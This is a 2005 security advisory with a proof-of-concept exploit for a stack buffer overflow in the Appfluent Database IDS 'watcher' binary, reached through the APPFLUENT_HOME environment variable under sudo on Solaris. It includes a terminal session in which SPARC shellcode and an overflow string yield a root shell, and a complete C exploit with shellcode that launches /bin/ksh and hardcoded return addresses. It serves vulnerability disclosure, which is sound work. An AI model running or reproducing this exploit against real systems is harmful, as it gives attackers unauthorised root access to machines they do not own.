 /*
  *****************************************************************************************************************
  $ An open security advisory #14 - Appfluent Database IDS Environment Variable Overflow
  *****************************************************************************************************************
  1: Bug Researcher: c0ntex - c0ntexb[at]gmail.com -+- www.open-security.org
  2: Bug Released: December 07th 2005
  3: Bug Impact Rate: Hi
  4: Bug Scope Rate: Local root
  *****************************************************************************************************************
  $ This advisory and/or proof of concept code must not be used for commercial gain.
  *****************************************************************************************************************
  
  Appfluent Database IDS v2.0
  http://www.appfluent.com

  "Appfluent Technology is the leading provider of data usage and query performance software designed to
  help IT organizations improve performance of Business Intelligence (BI) and enterprise applications,
  reduce the number of databases they maintain and quickly deploy new applications. Appfluent provides a
  suite of products that clean up and consolidate databases, optimize query performance based on usage,
  and rapidly analyze applications for both test and production environments."
  
  Appfluent provide a Database IDS system that monitors all SQL traffic in real time, logging every user
  defined transaction to a database, providing an audit trail of all transactions that take place. There
  are several processes that ecumulate together to provide the IDS solution, including watcher, analyser,
  alerter and reporter.


  There is a stack based buffer overflow in all binaries that allow for some malicious attacker to gain
  unauthorised code execution on the system where the application is installed. Due to incorrect use of
  strcpy(), and a lack of correct bounds checking, a user can manipulate the $APPFLUENT_HOME environment
  variable to overflow the stack buffer.

  The problem is specific to the watcher process, as it needs to be run as root due to the fact that it
  sniffs all traffic going to an interface. A script installed in $APPFLUENT_HOME/server_oracle/bin is
  supplied so that administrators can run the process via sudo.


  When run with sudo, we are provided a vector for root compromise as a default sudo install on Solaris
  (this example) and other operating systems honour the setting of environment variables. As such, when
  an attacker crafts $APPFLUENT_HOME in a malicious manner and runs the watcher process, root access to
  the system is gained.


  There are a few requirements that need to be met for the attack to be successful, and they include:

  	1) User is in the sudoers file and is defined as able to run the watcher process
	2) Sudo honours environment variables, meaning env_reset or the likes is not set

  Please note that users must set, or have $APPFLUENT_HOME set for the product to work, and if the above
  two requirements are met, an attacker is guaranteed to gain unauthorised root access to the system.


  Appfluent have released a fix and is provided in the latest version of the product => Ver: 2.1.0.103


  ###
  ## Proof run with a default sudo install from sunfreeware.
  ###
  [c0ntex@ ~/vuln]$ export SHELLCODE=`printf "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
  \x90\x90\x82\x10\x20\x18\x91\xd0\x20\x08\x90\x02\x60\x01\x90\x22\x20\x01\x92\x10\x3f
  \xff\x82\x10\x20\xca\x91\xd0\x20\x08\x82\x10\x20\x2f\x91\xd0\x20\x08\x90\x02\x60\x01
  \x90\x22\x20\x01\x92\x10\x3f\xff\x82\x10\x20\xcb\x91\xd0\x20\x08\x94\x1a\x80\x0a\x21
  \x0b\xd5\x9a\xa0\x14\x21\x6e\x23\x0b\xcb\xdc\xa2\x14\x63\x68\xd4\x23\xbf\xfc\xe2\x23
  \xbf\xf8\xe0\x23\xbf\xf4\x90\x23\xa0\x0c\xd4\x23\xbf\xfd\xd0\x23\xbf\xec\x92\x23\xa0
  \x14\x82\x10\x20\x3b\x91\xd0\x20\x08\x82\x10\x20\x01\x91\xd0\x20\x08"`
  [c0ntex@ ~/vuln]$ export APPFLUENT_HOME=`perl -e 'print "A" x 576'``printf "\xff\xbe
  \xfa\xd0\xff\xbe\xfa\xd0"`
  [c0ntex@ ~/vuln]$ sudo /tmp/watch/watcher -sc
  Password:
  Version: 2.0.0.103
  do_process: Exception:
    file: file_stream.cpp
    line: 338
    message: FileStream: fopen : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAÿ¾úÐÿ¾úÐ/oracle
  /config/config : 78 : File name too long
    code: 78
    stack:
  #0  void IC::ConfigFile::load(IC::StrP) at config_file.cpp:35
  #1  virtual void IC::ServerConfig::load() at /home/ask/lab/v2_0/app/product/server/lib/libserverconfig/server_config.cpp:70
  #2  virtual void IC::Watch::run(bool, bool) at /home/ask/lab/v2_0/app/product/server/lib/libwatch/watch.cpp:41
  #3  int do_process(bool) at /home/ask/lab/v2_0/app/product/server/bin/watch/do_process.cpp:21

  #
  #
  # uname -a
  SunOS  5.8 Generic_117350-24 sun4u sparc SUNW,UltraAX-i2
  #
  # id -a
  uid=0(root) gid=1(other) groups=1(other),0(root),2(bin),3(sys),4(adm),5(uucp),6(mail
  ),7(tty),8(lp),9(nuucp),12(daemon)
  #

  Greetings to everyone I know  ;-)

 */


  #include <stdio.h>
  #include <stdlib.h>
  #include <string.h>
  #include <unistd.h>

  #define DAHBUF   591
  #define NOP      0x90
  #define SUDO     "/usr/local/bin/sudo"
  #define VULN     "watcher"
  #define WOPT     "-sc"

  char shellcode[] = "\x20\xbf\xff\xff\x20\xbf\xff\xff\x7f\xff\xff\xff\x90\x03\xe0\x20"
                     "\x92\x02\x20\x10\xc0\x22\x20\x08\xd0\x22\x20\x10\xc0\x22\x20\x14"
                     "\x82\x10\x20\x0b\x91\xd0\x20\x08/bin/ksh";

  char retloc[] = "\xff\xbe\xfd\xe9";
  char retlok[] = "\xff\xbe\xfd\xed";

  int main()
  {
        char env[DAHBUF+9];

        puts("\nLocal root proof of concept for Appfluent IDS Watcher environment overflow");
        puts("found and developed by c0ntex || c0ntexb@gmail.com || www.open-security.org\n"); 

        memset(env, NOP, DAHBUF);

        memcpy(env + 100, shellcode, strlen(shellcode));
        memcpy(env + DAHBUF, retloc, strlen(retloc));
        memcpy(env + DAHBUF + 4, retlok, strlen(retlok));
        env[DAHBUF+9] = '\0';

        strncpy(&env[0], "APPFLUENT_HOME=", 15);

        if(!env) {
             puts("barfed!");
             return(EXIT_FAILURE);
        }

        putenv(env);

        if(execl(SUDO, SUDO, VULN, WOPT, NULL) < 0) {
             perror("execle");
             return(EXIT_FAILURE);
        }

        return(EXIT_SUCCESS);
  }

// milw0rm.com [2005-12-07]
